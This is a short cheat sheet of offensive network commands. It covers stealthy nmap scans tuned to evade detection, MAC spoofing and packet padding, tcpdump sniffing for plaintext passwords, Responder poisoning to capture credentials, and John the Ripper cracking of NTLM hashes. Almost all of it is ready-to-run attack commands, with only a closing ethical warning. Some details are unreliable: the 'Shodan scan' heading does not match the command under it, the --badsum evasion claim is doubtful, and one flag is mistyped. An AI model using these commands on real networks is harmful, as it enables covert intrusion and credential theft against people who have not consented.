# Stealth Scanning with Nmap

```bash
nmap -sS -T2 -Pn --scan-delay 500ms --max-retries 2 --host-timeout 10m -oN scan_discret.txt example.com
```

- **Stealth scan (-sS)** to avoid establishing a full connection.
- **Slow speed (-T2, --scan-delay 500ms)** to evade detection based on packet frequency.
- **Skip active discovery (-Pn)** to avoid triggering defensive mechanisms.
- **Limit retries (--max-retries 2)** to prevent persistent probing.
- **Scan timeout (-host-timeout 10m)** to avoid prolonged exposure.

---

## Faking Fingerprints to Resemble a Shodan Scan

```bash
nmap -sS -T2 -Pn --spoof-mac 00:24:a5:9b:47:1f --data-length 120 --badsum example.com
```

- **MAC address spoofing (--spoof-mac)** to impersonate another device.
- **Random data injection (--data-length 120)** to obfuscate packet analysis.
- **Incorrect checksum (--badsum)** to evade certain Deep Packet Inspection (DPI) mechanisms.

---

## Packet Sniffing with tcpdump

```bash
tcpdump -i eth0 -nn -X port not 22 and not 443
```

- **Capture all traffic except SSH (22) and HTTPS (443).**
- **Analyze unsecured traffic that may leak sensitive information.**
- **Detect plaintext passwords, poorly protected HTTP requests, file transfers, etc.**

---

## Credential Harvesting & Cracking

```bash
responder -I eth0
```

- **Responder**: LLMNR, NBT-NS, and MDNS poisoning to capture credentials.

```bash
john --format=NTLM hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- **John the Ripper**: Crack NTLM hashes using a predefined wordlist.

---

⚠️ **Ethical Warning**: These techniques should only be used for security auditing and ethical hacking purposes within a legal framework. Unauthorized scanning and sniffing can have serious legal consequences.

